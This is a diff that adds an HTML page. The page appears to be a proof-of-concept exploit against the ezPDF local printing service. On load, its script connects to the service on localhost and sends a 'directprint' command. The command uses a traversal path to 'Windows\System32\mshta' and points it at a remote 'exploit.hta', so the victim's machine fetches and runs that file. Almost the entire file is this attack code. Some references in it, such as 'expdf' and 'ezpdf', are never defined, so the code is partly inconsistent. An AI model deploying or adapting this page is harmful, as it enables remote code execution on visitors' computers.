@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        var ezPDFWSInfo = new function() {
+            this._module = "..\\..\\..\\Windows\\System32\\mshta";
+            this._version = "2.0.2.20";
+            this._key = "90C55F2383AD7B92BC2A5A702A746A55";
+            this._id = "";
+            this._checkValue = "";
+};
+
+function ezPDFCommand(m) {	
+	this._debug = 0;
+	this._ezpdfmodule = m;
+	this._t = this.SupportBrowserType();
+
+	if(this._t == 0)
+	{
+		if (document.location.protocol == 'https:') 
+		{
+			
+			if(navigator.userAgent.toLowerCase().indexOf('chrome/') > -1){
+				this._type ="ws";
+				this._port = 22083;
+				
+			}else{
+				this._type ="wss";
+				this._port = 22084;
+			}
+			
+		}else{
+			this._type ="ws";
+			this._port = 22083;
+		}
+	}else{
+		if (document.location.protocol == 'https:') 
+		{
+			this._type ="https";
+			this._port = 22084;
+		}else{
+			this._type ="http";
+			this._port = 22083;
+		}
+	}
+	
+	this._protocol = "ezpdf-msg-protocol";
+	this._bError = false;
+	this._webSocket; 
+
+	this.Connect();
+};
+
+ezPDFCommand.prototype.SetPort = function(p){
+	this._port = p;
+};
+
+ezPDFCommand.prototype.GetURL = function(){
+	var url;
+	if(this._t == 0)
+		url = this._type + "://127.0.0.1:" + this._port + "/";
+	else
+		url = this._type + "://127.0.0.1:" + this._port + "/launch";
+
+	return url;
+};
+
+ezPDFCommand.prototype.SupportBrowserType = function(){
+	var type = 0;
+
+	if(this._debug == 1)
+		alert(navigator.userAgent.toLowerCase());
+
+	var is_safari = navigator.userAgent.toLowerCase().indexOf('safari/') > -1 && navigator.userAgent.toLowerCase().indexOf('chrome/') < 1;
+	if(is_safari)
+	{
+		//alert("safari");
+		if(this._debug == 1)
+			alert("XMLHttpRequest");
+		type = 2;
+		return type;
+	}
+
+	/*var is_ie7 = navigator.userAgent.toLowerCase().indexOf('msie 7') > -1;
+	if(is_ie7)
+	{
+		if(this._debug == 1)
+			alert("MSXML2.XMLHTTP.3.0");
+		type = 3;
+		return type;
+	}*/
+
+	if(window.WebSocket)
+	{
+		type = 0;
+		if(this._debug == 1)
+			alert("WebSocket");
+	}
+	else 
+	{
+		if(window.XDomainRequest)
+		{
+			type = 1;
+			if(this._debug == 1)
+				alert("XDomainRequest");
+		}else if(window.XMLHttpRequest){
+			type = 2;
+			if(this._debug == 1)
+				alert("XMLHttpRequest");
+		}else{
+			type = 3;
+			if(this._debug == 1)
+				alert("MSXML2.XMLHTTP.3.0");
+		}
+	}
+	return type;
+};
+
+ezPDFCommand.prototype.Connect = function(){
+	var url = this.GetURL();
+	if(this._t == 0)
+	{
+		this._webSocket = new WebSocket(url, this._protocol);
+		this._webSocket.onopen = function(e) {
+			setTimeout(RunCommand, 30);
+		};
+			
+		this._webSocket.onclose = function(e) {
+		};
+
+		this._webSocket.onerror = function (e) {
+			if(this._debug == 1)
+				alert("WebSocket : onerror");
+			//ReRun();
+		};
+			
+		this._webSocket.onmessage = function (message) {
+			var contact = JSON.parse(message.data);
+
+			var type = contact.type;
+			var code = contact.code;
+			var msg = contact.msg;
+
+			/*
+			switch (type) {
+				case "check":
+					SetCheckVersion(code);
+					break;
+				default:
+					break;
+			}
+			*/
+		};
+	}/* else{
+		setTimeout(CheckVersion, 30);
+	}*/
+};
+
+ezPDFCommand.prototype.Send = function(input){	
+	if(this._t == 0)
+	{
+		this._webSocket.send(input);	
+	}else
+	{
+		var xmlhttp;
+		if(this._t == 1)
+		{
+			xmlhttp = new window.XDomainRequest;
+			xmlhttp.open("POST", this.GetURL());
+			xmlhttp.onerror = function() {
+				//ReRun();
+			};
+			xmlhttp.onload = function() {				
+				var contact = JSON.parse(xmlhttp.responseText);
+				var type = contact.type;
+				var code = contact.code;
+				var msg = contact.msg;
+
+				/*
+				switch (type) {
+					case "check":
+						SetCheckVersion(code);
+						break;
+					default:
+						break;	
+				}
+				*/
+			};
+			xmlhttp.send(input);	
+		}
+		else if(this._t == 2)
+		{
+			xmlhttp = new window.XMLHttpRequest;
+			xmlhttp.open("POST", this.GetURL(), true);
+			xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+			//xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+			//xmlhttp.setRequestHeader('Content-Length', input.length);
+			xmlhttp.send(input);	
+			xmlhttp.onreadystatechange = function () {	
+				if (xmlhttp.readyState == 4) {
+					if(xmlhttp.status == 200)
+					{
+						var contact = JSON.parse(xmlhttp.responseText);
+						var type = contact.type;
+						var code = contact.code;
+						var msg = contact.msg;
+
+						/*
+						switch (type) {
+							case "check":
+								SetCheckVersion(code);
+								break;
+							default:
+								break;
+						}
+						*/
+					}/*else{		
+						ReRun();
+					}*/
+				}
+			};
+		} else {
+			xmlhttp = new ActiveXObject("MSXML2.XMLHTTP.3.0");
+			xmlhttp.open("POST", this.GetURL(), true);
+			xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+			xmlhttp.setRequestHeader('Content-Length', input.length);
+			xmlhttp.send(input);	
+			xmlhttp.onreadystatechange = function () {			
+				if (xmlhttp.readyState == 4) {
+					if(xmlhttp.status == 200)
+					{
+						var contact = JSON.parse(xmlhttp.responseText);
+						var type = contact.type;
+						var code = contact.code;
+						var msg = contact.msg;
+
+						/*
+						switch (type) {
+							case "check":
+								SetCheckVersion(code);
+								break;
+							default:
+								break;
+						}
+						*/
+					}/*else{		
+						ReRun();
+					}*/
+				}
+			};
+		}
+	}
+};
+
+	function RunCommand(){
+		var command = {
+			type: "directprint",
+			module: ezpdf._ezpdfmodule._module,
+			key: ezpdf._ezpdfmodule._key,
+			data: {
+				pdf: "http://127.0.0.1:5000/exploit.hta"
+			}
+		}
+		var result = JSON.stringify(command);
+		if(ezpdf._debug == 1)
+			alert(result);
+		expdf.Send(result);
+	};
+
+    </script>
+</body>
+</html>
